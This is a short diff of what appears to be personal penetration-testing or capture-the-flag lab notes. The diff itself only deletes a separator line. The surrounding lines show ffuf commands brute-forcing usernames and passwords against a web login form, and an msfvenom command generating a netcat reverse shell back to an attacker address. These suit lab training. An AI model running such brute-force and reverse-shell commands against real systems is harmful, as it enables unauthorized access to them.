@@ -332,8 +332,6 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
 
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.179.106/customers/login -fc 200
 
-------
-
 msfvenom -p cmd/unix/reverse_netcat LHOST=10.50.105.183 LPORT=443
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
